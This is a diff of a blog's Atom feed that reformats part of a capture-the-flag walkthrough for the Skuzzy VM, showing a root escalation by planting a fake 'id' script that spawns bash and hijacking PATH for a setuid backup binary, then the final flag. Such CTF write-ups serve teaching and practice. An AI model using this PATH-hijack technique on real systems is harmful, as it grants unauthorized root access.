@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Walkthrough | CyberSlave]]></title>
   <link href="http://ryanoberto.github.io/blog/categories/walkthrough/atom.xml" rel="self"/>
   <link href="http://ryanoberto.github.io/"/>
-  <updated>2017-03-28T14:16:11+02:00</updated>
+  <updated>2017-03-28T14:20:11+02:00</updated>
   <id>http://ryanoberto.github.io/</id>
   <author>
     <name><![CDATA[Ryan Oberto]]></name>
@@ -403,15 +403,12 @@ ssh: Could not resolve hosdtname alice.home: Name or service not known
 lost connection
 </code></pre>
 
-<pre><code>lets create our own id command
+<p>lets create our own id command</p>
+
+<pre><code>cat /tmp/id
+#!/bin/bash
+/bin/bash
 </code></pre>
-
-<p>cat /tmp/id</p>
-
-<h1>!/bin/bash</h1>
-
-<p>/bin/bash
-&#8220;`</p>
 
 <p>change our path so it gets called</p>
 
@@ -422,25 +419,31 @@ lost connection
 ./alicebackup
 bash: groups: command not found
 root@skuzzy:/opt# 
-root@skuzzy:/opt# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
 </code></pre>
 
-<pre><code>root@skuzzy:/root# cat flag.txt
-Congratulations!
+<p>Fix our PATH
+<code>
+root@skuzzy:/opt# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
+</code></p>
 
-flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}
+<p>Flag 5
+&#8220;`
+root@skuzzy:/root# cat flag.txt
+Congratulations!</p>
 
-You've found the final flag and pwned this CTF VM!
+<p>flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}</p>
 
-I really hope this was an enjoyable challenge, and that my trolling and messing with you didn't upset you too much! I had a blast making this VM, so it won't be my last!
+<p>You&rsquo;ve found the final flag and pwned this CTF VM!</p>
 
-I'd love to hear your thoughts on this one.
+<p>I really hope this was an enjoyable challenge, and that my trolling and messing with you didn&rsquo;t upset you too much! I had a blast making this VM, so it won&rsquo;t be my last!</p>
+
+<p>I&rsquo;d love to hear your thoughts on this one.
 Too easy?
 Too hard?
-Too much stuff to install to get the iSCSI initiator working?
+Too much stuff to install to get the iSCSI initiator working?</p>
 
-Drop me a line on twitter @vortexau, or via email vortex@juicedigital.net
-</code></pre>
+<p>Drop me a line on twitter @vortexau, or via email <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x76;&#111;&#x72;&#116;&#x65;&#120;&#64;&#106;&#x75;&#x69;&#99;&#x65;&#x64;&#x69;&#103;&#x69;&#116;&#x61;&#108;&#46;&#x6e;&#x65;&#116;">&#x76;&#x6f;&#114;&#x74;&#x65;&#x78;&#x40;&#106;&#x75;&#x69;&#x63;&#x65;&#x64;&#x69;&#x67;&#x69;&#116;&#97;&#x6c;&#46;&#110;&#x65;&#116;</a>
+&#8220;`</p>
 
 <p>This was great fun and learnt something new, Thanks <a href="https://twitter.com/@vortexau">@vortexau</a></p>
 ]]></content>
